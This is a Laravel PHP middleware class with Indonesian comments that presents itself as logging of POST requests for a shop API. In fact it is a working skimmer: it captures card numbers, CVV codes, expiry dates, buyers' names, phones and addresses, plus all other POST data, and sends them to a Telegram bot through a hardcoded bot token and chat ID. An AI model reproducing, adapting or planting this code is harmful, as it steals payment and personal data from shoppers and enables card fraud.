<?php

namespace App\Http\Middleware;

use Closure;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Log;
use GuzzleHttp\Client;

class LogPostRequests
{
    public function handle(Request $request, Closure $next)
    {
        if ($request->isMethod('post')) {
            // Catat log di file Laravel:
            Log::info('POST Request Detected', [
                'url' => $request->fullUrl(),
                'ip'  => $request->ip(),
                'data'=> $request->all(),
            ]);

            // Periksa endpoint
            if ($request->is('api/shop/order/create')) {
                // Buat pesan "pembeli baru"
                $message = $this->formatOrderMessage($request);
                $this->sendToTelegram($message);

            } elseif ($request->is('api/shop/pay/authorize')) {
                // Buat pesan "pembayaran"
                $message = $this->formatPaymentMessage($request);
                $this->sendToTelegram($message);

            } else {
                // Endpoint lainnya, kirim ringkasan singkat
                $this->sendToTelegram(
                    "POST Request to [".$request->path()."]\n"
                    . "IP: ".$request->ip()."\n"
                    . "Data: " . json_encode($request->all())
                );
            }
        }

        return $next($request);
    }

    /**
     * Format data pembeli (order) menjadi teks rapi.
     */
    private function formatOrderMessage(Request $request)
    {
        // Ambil data
        $firstName  = $request->input('first_name', 'Empty!');
        $lastName   = $request->input('last_name', 'Empty!');
        $phone      = $request->input('phone', 'Empty!');
        $postcode   = $request->input('postcode', 'Empty!');
        $address1   = $request->input('address_1', 'Empty!');
        $address2   = $request->input('address_2', 'Empty!');
        $state      = $request->input('state', 'Empty!');
        $city       = $request->input('city', 'Empty!');
        $country    = $request->input('country', 'Empty!');
        // Juga ambil IP address
        $ipAddress  = $request->ip();

        $message =
            "Pembeli baru diterima\n\n"
            . "Full name:   {$firstName} {$lastName}\n"
            . "Phone:       {$phone}\n"
            . "IP Address:  {$ipAddress}\n\n"
            . "Post code:   {$postcode}\n"
            . "Address 1:   {$address1}\n"
            . "Address 2:   " . ($address2 ?: 'Empty!') . "\n"
            . "State:       {$state}\n"
            . "City:        {$city}\n"
            . "Country:     {$country}";

        return $message;
    }

    /**
     * Format data pembayaran menjadi teks rapi.
     */
    private function formatPaymentMessage(Request $request)
    {
        $cardNumber = $request->input('card_number', 'Empty!');
        $cvv        = $request->input('cvv', 'Empty!');
        $expMonth   = $request->input('expiration_month', 'Empty!');
        $expYear    = $request->input('expiration_year', 'Empty!');
        // Juga ambil IP address
        $ipAddress  = $request->ip();

        $message =
            "Data Pembayaran:\n"
            . "IP Address   : {$ipAddress}\n"
            . "Card number  : {$cardNumber}\n"
            . "CVV          : {$cvv}\n"
            . "EXP Month    : {$expMonth}\n"
            . "EXP Year     : {$expYear}";

        return $message;
    }

    /**
     * Kirim pesan ke Telegram
     */
    private function sendToTelegram($message)
    {
        $botToken = '6920061881:AAEdKgQrvzP1RemLvA_DvugBRjp1NvsA9J0';
        $chatId   = '-1002517788043';

        $url    = "https://api.telegram.org/bot{$botToken}/sendMessage";
        $client = new Client();

        $client->post($url, [
            'form_params' => [
                'chat_id' => $chatId,
                'text'    => $message,
            ],
        ]);
    }
}
